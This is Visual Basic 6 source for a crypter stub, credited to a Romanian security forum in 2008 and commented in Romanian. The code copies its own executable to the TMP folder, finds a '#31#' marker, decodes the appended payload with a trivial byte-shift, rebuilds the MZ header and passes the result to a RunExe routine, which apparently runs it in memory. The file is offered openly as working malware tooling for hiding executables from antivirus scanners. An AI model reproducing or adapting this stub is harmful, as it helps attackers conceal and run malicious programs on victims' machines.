Attribute VB_Name = "StubModule"
' #################################
'      Stub File for Crypter
'        (c) Nytro 2008
' http://www.rstcenter.com/forum/
' (c) Romanian Security Team 2008
' #################################

Private Declare Sub Sleep Lib "kernel32.dll" (ByVal dwMilliseconds As Long)

Public Sub Main()

' Copiem fiserul in Temp folosind cmd

Shell "cmd.exe /c copy " & Chr(34) & App.Path & "\" & App.EXEName & ".exe" & Chr(34) & " " & Chr(34) & Environ("TMP") & "\file.rst" & Chr(34)

' Asteptam putin sa se copieze fisierul

Sleep 500

' Variabilele de care vom avea nevoie

Dim biti() As Byte
Dim crypted() As Byte
Dim i As Long
Dim j As Long
Dim k As Long
Dim L As Long

' Citim fisierul implicit

Open Environ("TMP") & "\file.rst" For Binary As #1
ReDim biti(LOF(1) - 1)
Get #1, , biti
Close #1

' Gasim separatorul ( leet )

For j = 15000 To UBound(biti) - 4

  If biti(j) = 35 And biti(j + 1) = 51 And biti(j + 2) = 49 And biti(j + 3) = 35 Then
  
  ReDim crypted(UBound(biti) - j + 4)
  
  L = 2
  
  ' MZ Signature pe care nu am citit-o din fisier cand l-am cryptat
  
  crypted(0) = 77 'M
  crypted(1) = 90 'Z
  
    For k = j + 4 To UBound(biti)
    
    ' Inversam octetii cu acelasi algoritm "extrem de complex"
    
  If biti(k) <= 31 Then
     biti(k) = biti(k) + 65
  ElseIf biti(k) >= 65 And biti(k) <= 96 Then
     biti(k) = biti(k) - 65
  End If
      
      ' Copiem bytes in vectorul crypted
      
      crypted(L) = biti(k)
      
      L = L + 1
      
    Next
    
  End If
Next

' Incarcam fisierul in memorie

RunExe crypted

End Sub



